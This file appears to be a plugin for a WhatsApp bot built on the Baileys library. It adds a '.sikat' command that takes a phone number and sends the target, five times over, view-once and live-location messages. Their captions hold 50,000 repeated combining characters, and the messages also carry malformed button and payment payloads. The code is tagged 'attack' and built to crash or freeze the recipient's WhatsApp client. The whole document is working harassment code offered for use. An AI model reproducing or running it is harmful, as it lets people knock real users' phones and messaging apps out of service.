const fs = require('fs')
const { BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
generateWAMessageFromContent, 
proto, 
generateWAMessageContent, 
generateWAMessage, 
prepareWAMessageMedia, 
areJidsSameUser, 
getContentType 
} = require('@adiwajshing/baileys')

async function skids(target, apalah) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({ viewOnceMessage: {message: {"interactiveMessage": {"header": {"title": "","subtitle": ""},"body": {"text": `DemonXMods V3 💀` + "ྦྷ".repeat(50000)},"footer": {"text": "KokNdakNgefekJir"},"nativeFlowMessage": {"buttons": [{"name": "cta_url","buttonParamsJson": "{ display_text : 'Skidayo', url : , merchant_url : }"}],"messageParamsJson": "".repeat(890989)}}}}

}), { userJid: target, quoted: apalah })
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })

}

async function ngeloc(target, apalah) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({

viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `DemojXMods V3 💀` + "ྦྷ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}

}), { userJid: target, quoted: apalah })
await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
let handler = async (m, { text }) => {
if (!text) {
	return m.reply('\`\`\`Invalid Usage\`\`\`\n.sikat 62888xxxx')
	}
const halah =  text + '@s.whatsapp.net'
await m.reply('\`Sebentar Maniez...\`')
for (let p = 0; p < 5; p++) {
	
await ngeloc(halah, {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/m.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"PermenMisc؜\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
})

await skids(halah, {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `DemonXMods`
}
}
})

}
await conn.sendMessage(m.chat, {
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: global.title,
                    body: global.namabot,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailUrl: global.attacking,
                    sourceUrl: ``
                }
            },
            text: `\`\`\`Sukses Maniez\`\`\` ${halah}`
        }, { quoted: m });
}

handler.help = ['sikat']
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(sikat)$/i;
module.exports = handler